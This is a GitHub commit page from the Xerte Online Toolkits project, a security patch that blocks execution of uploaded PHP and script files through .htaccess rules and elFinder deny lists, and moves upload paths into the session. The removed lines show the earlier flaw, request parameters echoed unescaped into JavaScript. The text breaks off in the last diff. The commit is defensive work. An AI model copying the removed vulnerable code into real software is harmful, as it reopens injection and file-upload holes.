=== Content from github.com_f001850c_20250114_222801.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fthexerteproject%2Fxerteonlinetoolkits%2Fcommit%2F694a591b5ab7f634f036afaac10397cf3677a98c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fthexerteproject%2Fxerteonlinetoolkits%2Fcommit%2F694a591b5ab7f634f036afaac10397cf3677a98c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=thexerteproject%2Fxerteonlinetoolkits)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[thexerteproject](/thexerteproject)
/
**[xerteonlinetoolkits](/thexerteproject/xerteonlinetoolkits)**
Public

* [Notifications](/login?return_to=%2Fthexerteproject%2Fxerteonlinetoolkits) You must be signed in to change notification settings
* [Fork
  61](/login?return_to=%2Fthexerteproject%2Fxerteonlinetoolkits)
* [Star
   64](/login?return_to=%2Fthexerteproject%2Fxerteonlinetoolkits)

* [Code](/thexerteproject/xerteonlinetoolkits)
* [Issues
  173](/thexerteproject/xerteonlinetoolkits/issues)
* [Pull requests
  8](/thexerteproject/xerteonlinetoolkits/pulls)
* [Actions](/thexerteproject/xerteonlinetoolkits/actions)
* [Projects
  0](/thexerteproject/xerteonlinetoolkits/projects)
* [Wiki](/thexerteproject/xerteonlinetoolkits/wiki)
* [Security](/thexerteproject/xerteonlinetoolkits/security)
* [Insights](/thexerteproject/xerteonlinetoolkits/pulse)

Additional navigation options

* [Code](/thexerteproject/xerteonlinetoolkits)
* [Issues](/thexerteproject/xerteonlinetoolkits/issues)
* [Pull requests](/thexerteproject/xerteonlinetoolkits/pulls)
* [Actions](/thexerteproject/xerteonlinetoolkits/actions)
* [Projects](/thexerteproject/xerteonlinetoolkits/projects)
* [Wiki](/thexerteproject/xerteonlinetoolkits/wiki)
* [Security](/thexerteproject/xerteonlinetoolkits/security)
* [Insights](/thexerteproject/xerteonlinetoolkits/pulse)

## Commit

[Permalink](/thexerteproject/xerteonlinetoolkits/commit/694a591b5ab7f634f036afaac10397cf3677a98c)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Security patch - Thank you Rik Lutz

[Browse files](/thexerteproject/xerteonlinetoolkits/tree/694a591b5ab7f634f036afaac10397cf3677a98c)
Browse the repository at this point in the history

```
 - Fixed and stopped possibility to upload constructed php files throgh
   elfinder
 - Added .htaccess files to try to tighten security on apache servers
 - Always use extension blacklist (ignore management page setting)
 - Stop XSS in print
 - Several other small improvements
```

* Loading branch information

[![@torinfo](https://avatars.githubusercontent.com/u/5166596?s=40&v=4)](/torinfo)

[torinfo](/thexerteproject/xerteonlinetoolkits/commits?author=torinfo "View all commits by torinfo")
committed
Mar 27, 2020

1 parent
[113a842](/thexerteproject/xerteonlinetoolkits/commit/113a842eb3add1c66ecc34d2fa6311f090e112c6)

commit 694a591

 Show file tree

 Hide file tree

Showing
**21 changed files**
with
**193 additions**
and
**15 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* USER-FILES

  + USER-FILES/.htaccess
    [.htaccess](#diff-b7d475328c5456a44e952d926c965d0b1ff7d809a4a79d47be9b3e8bd00d4976)
* editor/elfinder

  + editor/elfinder/browse.php
    [browse.php](#diff-cb0c1d3883a56f89e92b20d9ca9ffb3b5db6a3bba704e2181aee62f9ce2c683f)
  + php

    - editor/elfinder/php/connector.php
      [connector.php](#diff-1e73f90b9202746994eead108e840cbce3d33d4bb66bb688198cf74c3cfeeefa)
    - editor/elfinder/php/elFinderVolumeDriver.class.php
      [elFinderVolumeDriver.class.php](#diff-1d865092bf64136a7fbf246a8887bd8008a32178ea8740272d6dcb7f94d2b522)
    - editor/elfinder/php/mime.types
      [mime.types](#diff-2e1faf0e9e935e49c60b097c57a54f7d2f01563dd2dbf0fd8bc992a55ff07e00)
* error\_logs

  + error\_logs/.htaccess
    [.htaccess](#diff-87f25b7747c37fda12ebc0888c2a48c4f71a009ef95531a37ffd2375a556839a)
* import

  + import/.htaccess
    [.htaccess](#diff-78270f82395b42a23dce0540ff266dd9dc5b3d56e5ed96bf7fc661ca0f404b4c)
* languages

  + languages/.htaccess
    [.htaccess](#diff-a66851e13272f161546cc5cb5f67609d8ceeedafb0ebcabf2ac96b4ca4c741da)
* modules

  + decision/templates/decision

    - modules/decision/templates/decision/.htaccess
      [.htaccess](#diff-89c82bce0ccb043cbfaa6ca78ddd88e32fb8b909edde8af1898c35aa028cd007)
  + site/templates/site

    - modules/site/templates/site/.htaccess
      [.htaccess](#diff-2ee4e64197a98da7d91a0e07bbd4e5c354593ef0a6f28160062a338a6e35305f)
  + xerte/templates

    - FutureTeacher

      * modules/xerte/templates/FutureTeacher/.htaccess
        [.htaccess](#diff-b95efeeb815649a9881564e8fbf7dae4550c0ecea42513c7dc70cc67c2f09c01)
    - Nottingham

      * modules/xerte/templates/Nottingham/.htaccess
        [.htaccess](#diff-cda09cb894c8086d2c4999be4c0fb0987930fa964c59ec9136863f6482adf2e9)
    - Rss

      * modules/xerte/templates/Rss/.htaccess
        [.htaccess](#diff-95bf08ee89982b57c161af81c786246f696b56e52c2d2fc56dee48540f83620b)
    - mediaInteractions

      * modules/xerte/templates/mediaInteractions/.htaccess
        [.htaccess](#diff-7cf1820e28740693cbfd2c94da6b55684af760698ee3df33c225e89960a3ac1e)
    - multipersp

      * modules/xerte/templates/multipersp/.htaccess
        [.htaccess](#diff-00f5ee3f75b425a0e0c82e14f60d2558cbbd7950e1f1e2ddd130b239fdfced2c)
* plugins

  + plugins/file\_uploading-extension-check.php
    [file\_uploading-extension-check.php](#diff-6b6e7c93677a6ea81f23666512d013dcfe213ddc4d148ae30815e5b2a439def2)
* print

  + print/index.php
    [index.php](#diff-3c5a4bbf0cc34a5f71941ef3cf2aed8819bdd09bccd56869ca592f6813bec3cf)
  + print/print.php
    [print.php](#diff-20d606887d1ad28c0128cf3edc3d2f02d1ba801ba92189f876899620ee2c6f2e)
* setup

  + setup/htaccess.conf
    [htaccess.conf](#diff-6ebc0f1f106636b2a8406f8105aa3646e08fda0a9387b0bebbeaff5e521861eb)
* website\_code/php

  + import

    - website\_code/php/import/fileupload.php
      [fileupload.php](#diff-27433bb0be90e431d40986f9afebe9ee2f8d1025a7f9e55c3cd7a86f1f8e3fdc)
  + management

    - website\_code/php/management/upload.php
      [upload.php](#diff-0f0b152421476b5a85197fcb35e4234e1d5b93f93c538f936a32c66736fcc817)

## There are no files selected for viewing

9 changes: 5 additions & 4 deletions

9
[USER-FILES/.htaccess](#diff-b7d475328c5456a44e952d926c965d0b1ff7d809a4a79d47be9b3e8bd00d4976 "USER-FILES/.htaccess")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/USER-FILES/.htaccess)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -5,7 +5,8 @@ Options -Indexes |
|  |  | # Try and tell Apache not to serve out any files within this directory as PHP - |
|  |  | # this helps close a potential security flaw - given people can upload almost anything into an LO. |
|  |  |  |
|  |  | #RemoveHandler .php |
|  |  | <FilesMatch "\.((php[0-9]?)|p?html?|pl|sh|java|cpp|c|h|js|rc)$"> |
|  |  | SetHandler None |
|  |  | </FilesMatch> |
|  |  | #prevent execution of php code (and other code) |
|  |  | <IfModule mod\_rewrite.c> |
|  |  | RewriteEngine On |
|  |  | RewriteRule .\*\.(php|php[0-9]|phtml|pl|sh|java|py)$ - [F] |
|  |  | </IfModule> |

35 changes: 34 additions & 1 deletion

35
[editor/elfinder/browse.php](#diff-cb0c1d3883a56f89e92b20d9ca9ffb3b5db6a3bba704e2181aee62f9ce2c683f "editor/elfinder/browse.php")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/editor/elfinder/browse.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -22,6 +22,39 @@ |
|  |  | \* Created by Tom Reijnders |
|  |  | \*/ |
|  |  |  |
|  |  | require\_once "../../config.php"; |
|  |  |  |
|  |  | if(empty($\_SESSION['toolkits\_logon\_id'])) { |
|  |  | die("Please login"); |
|  |  | } |
|  |  |  |
|  |  | // if there are GET paramters, put them in session and restart |
|  |  | if (isset($\_GET['uploadDir']) && isset($\_GET['uploadURL'])) |
|  |  | { |
|  |  | $\_SESSION['uploadDir'] = $\_REQUEST['uploadDir']; |
|  |  | $\_SESSION['uploadURL'] = $\_REQUEST['uploadURL']; |
|  |  |  |
|  |  | $params = "?"; |
|  |  | foreach($\_GET as $key => $param) |
|  |  | { |
|  |  | if ($key != "uploadDir" && $key != "uploadURL") |
|  |  | { |
|  |  | if (strlen($params) > 1) |
|  |  | { |
|  |  | $params .= "&"; |
|  |  | } |
|  |  | $params .= $key . "=" . $param; |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | header("Location: " . $\_SERVER["SCRIPT\_NAME"] . $params); |
|  |  | } |
|  |  |  |
|  |  | if (strpos($\_SESSION['uploadDir'], 'USER-FILES') === false || strpos($\_SESSION['uploadURL'], 'USER-FILES') === false) |
|  |  | { |
|  |  | die("Invalid upload location"); |
|  |  | } |
|  |  |  |
|  |  | $mode = 'standalone'; |
|  |  | if (isset($\_REQUEST['mode']) && $\_REQUEST['mode']=='cke') { |
|  |  | $mode = 'cke'; |
| Expand Down  Expand Up | | @@ -88,7 +121,7 @@ |
|  |  | ?> |
|  |  |  |
|  |  | $('#elfinder').elfinder({ |
|  |  | url : 'php/connector.php?uploadDir=<?php echo $\_REQUEST['uploadDir'];?>&uploadURL=<?php echo $\_REQUEST['uploadURL'];?>', // connector URL (REQUIRED) |
|  |  | url : 'php/connector.php?uploadDir=<?php echo $\_SESSION['uploadDir'];?>&uploadURL=<?php echo $\_SESSION['uploadURL'];?>', // connector URL (REQUIRED) |
|  |  | lang: '<?php echo $lang;?>', // language (OPTIONAL) |
|  |  | uiOptions : { |
|  |  | // toolbar configuration |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[editor/elfinder/php/connector.php](#diff-1e73f90b9202746994eead108e840cbce3d33d4bb66bb688198cf74c3cfeeefa "editor/elfinder/php/connector.php")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/editor/elfinder/php/connector.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -90,10 +90,10 @@ function sanitizeName($cmd, $result, $args, $elfinder) |
|  |  | 'path' => $rootpath . "/media", // path to files (REQUIRED) |
|  |  | 'URL' => $rooturl . "/media", // URL to files (REQUIRED) |
|  |  | 'accessControl' => 'access', // disable and hide dot starting files (OPTIONAL) |
|  |  | 'tmbPath' => $rootpath . "/media//.tmb", |
|  |  | 'tmbPath' => $rootpath . "/media/.tmb", |
|  |  | 'tmbURL' => $rooturl . "/media/.tmb", |
|  |  | 'tmbCrop' => false, |
|  |  | 'uploadDeny' => array('text/x-php'), |
|  |  | 'uploadDeny' => array('text/x-php','application/x-php'), |
|  |  | 'attributes' => array( |
|  |  | array( // hide readmes |
|  |  | 'pattern' => '/\.(txt|html|php|php5|php\*|py|pl|sh|xml)$/i', |
| Expand Down | |  |

4 changes: 4 additions & 0 deletions

4
[editor/elfinder/php/elFinderVolumeDriver.class.php](#diff-1d865092bf64136a7fbf246a8887bd8008a32178ea8740272d6dcb7f94d2b522 "editor/elfinder/php/elFinderVolumeDriver.class.php")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/editor/elfinder/php/elFinderVolumeDriver.class.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2193,6 +2193,10 @@ protected function mimetype($path, $name = '') { |
|  |  | if ($ext && preg\_match('~^application/(?:octet-stream|(?:x-)?zip)~', $type)) { |
|  |  | if (isset(elFinderVolumeDriver::$mimetypes[$ext])) $type = elFinderVolumeDriver::$mimetypes[$ext]; |
|  |  | } |
|  |  | if ($ext && strpos($type, "text/plain") === 0) |
|  |  | { |
|  |  | if (isset(elFinderVolumeDriver::$mimetypes[$ext])) $type = elFinderVolumeDriver::$mimetypes[$ext]; |
|  |  | } |
|  |  | } |
|  |  | } elseif ($type == 'mime\_content\_type') { |
|  |  | $type = mime\_content\_type($path); |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[editor/elfinder/php/mime.types](#diff-2e1faf0e9e935e49c60b097c57a54f7d2f01563dd2dbf0fd8bc992a55ff07e00 "editor/elfinder/php/mime.types")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/editor/elfinder/php/mime.types)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -227,7 +227,7 @@ application/x-palm-database pdb prc |
|  |  | application/x-par2 PAR2 par2 |
|  |  | application/x-pef-executable |
|  |  | application/x-perl pl pm al perl |
|  |  | application/x-php php php3 php4 |
|  |  | application/x-php php php3 php4 php5 |
|  |  | application/x-pkcs12 p12 pfx |
|  |  | application/x-planner planner mrproject |
|  |  | application/x-planperfect pln |
| Expand Down | |  |

12 changes: 12 additions & 0 deletions

12
[error\_logs/.htaccess](#diff-87f25b7747c37fda12ebc0888c2a48c4f71a009ef95531a37ffd2375a556839a "error_logs/.htaccess")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/error_logs/.htaccess)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,12 @@ |
|  |  | # Stop Apache doing directory indexing. |
|  |  | Options -Indexes |
|  |  |  |
|  |  |  |
|  |  | # Try and tell Apache not to serve out any files within this directory as PHP - |
|  |  | # this helps close a potential security flaw - given people can upload almost anything into an LO. |
|  |  |  |
|  |  | #prevent execution of php code (and other code) |
|  |  | <IfModule mod\_rewrite.c> |
|  |  | RewriteEngine On |
|  |  | RewriteRule .\*\.(php|php[0-9]|phtml|pl|sh|java|py|log)$ - [F] |
|  |  | </IfModule> |

12 changes: 12 additions & 0 deletions

12
[import/.htaccess](#diff-78270f82395b42a23dce0540ff266dd9dc5b3d56e5ed96bf7fc661ca0f404b4c "import/.htaccess")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/import/.htaccess)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,12 @@ |
|  |  | # Stop Apache doing directory indexing. |
|  |  | Options -Indexes |
|  |  |  |
|  |  |  |
|  |  | # Try and tell Apache not to serve out any files within this directory as PHP - |
|  |  | # this helps close a potential security flaw - given people can upload almost anything into an LO. |
|  |  |  |
|  |  | #prevent execution of php code (and other code) |
|  |  | <IfModule mod\_rewrite.c> |
|  |  | RewriteEngine On |
|  |  | RewriteRule .\*\.(php|php[0-9]|phtml|pl|sh|java|py)$ - [F] |
|  |  | </IfModule> |

12 changes: 12 additions & 0 deletions

12
[languages/.htaccess](#diff-a66851e13272f161546cc5cb5f67609d8ceeedafb0ebcabf2ac96b4ca4c741da "languages/.htaccess")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/languages/.htaccess)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,12 @@ |
|  |  | # Stop Apache doing directory indexing. |
|  |  | Options -Indexes |
|  |  |  |
|  |  |  |
|  |  | # Try and tell Apache not to serve out any files within this directory as PHP - |
|  |  | # this helps close a potential security flaw - given people can upload almost anything into an LO. |
|  |  |  |
|  |  | #prevent execution of php code (and other code) |
|  |  | <IfModule mod\_rewrite.c> |
|  |  | RewriteEngine On |
|  |  | RewriteRule .\*\.(php|php[0-9]|phtml|pl|sh|java|py)$ - [F] |
|  |  | </IfModule> |

12 changes: 12 additions & 0 deletions

12
[modules/decision/templates/decision/.htaccess](#diff-89c82bce0ccb043cbfaa6ca78ddd88e32fb8b909edde8af1898c35aa028cd007 "modules/decision/templates/decision/.htaccess")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/modules/decision/templates/decision/.htaccess)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,12 @@ |
|  |  | # Stop Apache doing directory indexing. |
|  |  | Options -Indexes |
|  |  |  |
|  |  |  |
|  |  | # Try and tell Apache not to serve out any files within this directory as PHP - |
|  |  | # this helps close a potential security flaw - given people can upload almost anything into an LO. |
|  |  |  |
|  |  | #prevent execution of php code (and other code) |
|  |  | <IfModule mod\_rewrite.c> |
|  |  | RewriteEngine On |
|  |  | RewriteRule .\*\.(php|php[0-9]|phtml|pl|sh|java|py)$ - [F] |
|  |  | </IfModule> |

12 changes: 12 additions & 0 deletions

12
[modules/site/templates/site/.htaccess](#diff-2ee4e64197a98da7d91a0e07bbd4e5c354593ef0a6f28160062a338a6e35305f "modules/site/templates/site/.htaccess")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/modules/site/templates/site/.htaccess)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,12 @@ |
|  |  | # Stop Apache doing directory indexing. |
|  |  | Options -Indexes |
|  |  |  |
|  |  |  |
|  |  | # Try and tell Apache not to serve out any files within this directory as PHP - |
|  |  | # this helps close a potential security flaw - given people can upload almost anything into an LO. |
|  |  |  |
|  |  | #prevent execution of php code (and other code) |
|  |  | <IfModule mod\_rewrite.c> |
|  |  | RewriteEngine On |
|  |  | RewriteRule .\*\.(php|php[0-9]|phtml|pl|sh|java|py)$ - [F] |
|  |  | </IfModule> |

12 changes: 12 additions & 0 deletions

12
[modules/xerte/templates/FutureTeacher/.htaccess](#diff-b95efeeb815649a9881564e8fbf7dae4550c0ecea42513c7dc70cc67c2f09c01 "modules/xerte/templates/FutureTeacher/.htaccess")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/modules/xerte/templates/FutureTeacher/.htaccess)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,12 @@ |
|  |  | # Stop Apache doing directory indexing. |
|  |  | Options -Indexes |
|  |  |  |
|  |  |  |
|  |  | # Try and tell Apache not to serve out any files within this directory as PHP - |
|  |  | # this helps close a potential security flaw - given people can upload almost anything into an LO. |
|  |  |  |
|  |  | #prevent execution of php code (and other code) |
|  |  | <IfModule mod\_rewrite.c> |
|  |  | RewriteEngine On |
|  |  | RewriteRule .\*\.(php|php[0-9]|phtml|pl|sh|java|py)$ - [F] |
|  |  | </IfModule> |

12 changes: 12 additions & 0 deletions

12
[modules/xerte/templates/Nottingham/.htaccess](#diff-cda09cb894c8086d2c4999be4c0fb0987930fa964c59ec9136863f6482adf2e9 "modules/xerte/templates/Nottingham/.htaccess")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/modules/xerte/templates/Nottingham/.htaccess)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,12 @@ |
|  |  | # Stop Apache doing directory indexing. |
|  |  | Options -Indexes |
|  |  |  |
|  |  |  |
|  |  | # Try and tell Apache not to serve out any files within this directory as PHP - |
|  |  | # this helps close a potential security flaw - given people can upload almost anything into an LO. |
|  |  |  |
|  |  | #prevent execution of php code (and other code) |
|  |  | <IfModule mod\_rewrite.c> |
|  |  | RewriteEngine On |
|  |  | RewriteRule .\*\.(php|php[0-9]|phtml|pl|sh|java|py)$ - [F] |
|  |  | </IfModule> |

12 changes: 12 additions & 0 deletions

12
[modules/xerte/templates/Rss/.htaccess](#diff-95bf08ee89982b57c161af81c786246f696b56e52c2d2fc56dee48540f83620b "modules/xerte/templates/Rss/.htaccess")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/modules/xerte/templates/Rss/.htaccess)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,12 @@ |
|  |  | # Stop Apache doing directory indexing. |
|  |  | Options -Indexes |
|  |  |  |
|  |  |  |
|  |  | # Try and tell Apache not to serve out any files within this directory as PHP - |
|  |  | # this helps close a potential security flaw - given people can upload almost anything into an LO. |
|  |  |  |
|  |  | #prevent execution of php code (and other code) |
|  |  | <IfModule mod\_rewrite.c> |
|  |  | RewriteEngine On |
|  |  | RewriteRule .\*\.(php|php[0-9]|phtml|pl|sh|java|py)$ - [F] |
|  |  | </IfModule> |

12 changes: 12 additions & 0 deletions

12
[modules/xerte/templates/mediaInteractions/.htaccess](#diff-7cf1820e28740693cbfd2c94da6b55684af760698ee3df33c225e89960a3ac1e "modules/xerte/templates/mediaInteractions/.htaccess")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/modules/xerte/templates/mediaInteractions/.htaccess)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,12 @@ |
|  |  | # Stop Apache doing directory indexing. |
|  |  | Options -Indexes |
|  |  |  |
|  |  |  |
|  |  | # Try and tell Apache not to serve out any files within this directory as PHP - |
|  |  | # this helps close a potential security flaw - given people can upload almost anything into an LO. |
|  |  |  |
|  |  | #prevent execution of php code (and other code) |
|  |  | <IfModule mod\_rewrite.c> |
|  |  | RewriteEngine On |
|  |  | RewriteRule .\*\.(php|php[0-9]|phtml|pl|sh|java|py)$ - [F] |
|  |  | </IfModule> |

12 changes: 12 additions & 0 deletions

12
[modules/xerte/templates/multipersp/.htaccess](#diff-00f5ee3f75b425a0e0c82e14f60d2558cbbd7950e1f1e2ddd130b239fdfced2c "modules/xerte/templates/multipersp/.htaccess")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/modules/xerte/templates/multipersp/.htaccess)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,12 @@ |
|  |  | # Stop Apache doing directory indexing. |
|  |  | Options -Indexes |
|  |  |  |
|  |  |  |
|  |  | # Try and tell Apache not to serve out any files within this directory as PHP - |
|  |  | # this helps close a potential security flaw - given people can upload almost anything into an LO. |
|  |  |  |
|  |  | #prevent execution of php code (and other code) |
|  |  | <IfModule mod\_rewrite.c> |
|  |  | RewriteEngine On |
|  |  | RewriteRule .\*\.(php|php[0-9]|phtml|pl|sh|java|py)$ - [F] |
